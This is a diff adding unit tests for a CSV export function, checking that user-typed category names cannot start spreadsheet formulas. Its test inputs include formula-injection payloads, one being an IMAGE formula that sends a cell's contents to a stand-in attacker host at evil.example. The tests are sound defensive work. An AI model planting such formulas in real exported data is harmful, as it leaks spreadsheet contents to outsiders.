@@ -27,6 +27,34 @@ describe('evolution CSV', () => {
     expect(csvText('-Taxa')).toBe("'-Taxa");
   });
 
+  // Category names are typed by any editor of a shared workspace and end up in the owner's
+  // spreadsheet: no cell may start a formula, whatever separator the spreadsheet splits on.
+  it('defuses formulas hidden behind whitespace, full-width signs or line breaks', () => {
+    for (const name of [' =1+1', '　=1+1', '＝1+1', '＋1', '\n=1+1', '\t=1+1', '@SUM(A1)']) {
+      const cell = csvText(name).replace(/^"|"$/g, '');
+      expect(cell.startsWith("'"), JSON.stringify(name)).toBe(true);
+    }
+    // Ordinary names keep their text.
+    expect(csvText(' Mercado')).toBe(' Mercado');
+    expect(csvText('Saúde & bem-estar')).toBe('Saúde & bem-estar');
+  });
+
+  it('no formula appears when the file is split on commas, tabs or line breaks (other locales)', () => {
+    // Excel with a comma list separator (en-US) or a "paste as text" splits the line on `,`/tab,
+    // ignoring the quotes in the middle of a field: each piece must still be inert.
+    const payloads = [
+      'Lazer,=IMAGE("https://evil.example/?"&A1)',
+      'Casa;+1',
+      'Casa\t-2+3',
+      'Casa\n@SUM(A1)',
+      'Casa, =HYPERLINK("x")',
+    ];
+    for (const name of payloads) {
+      const fields = csvText(name).split(/[,;\t\r\n]/).map((f) => f.replace(/^"/, ''));
+      for (const f of fields) expect(/^[\s　]*[=+\-@＝＋－＠]/.test(f), `${JSON.stringify(name)} → ${f}`).toBe(false);
+    }
+  });
+
   it('writes groups, categories, subcategories and the result', () => {
     const food = row('Alimentação', [1000, 2000], [row('Mercado', [1000, 1500]), row('Restaurantes', [0, 500])]);
     const report: EvolutionReportResponse = {
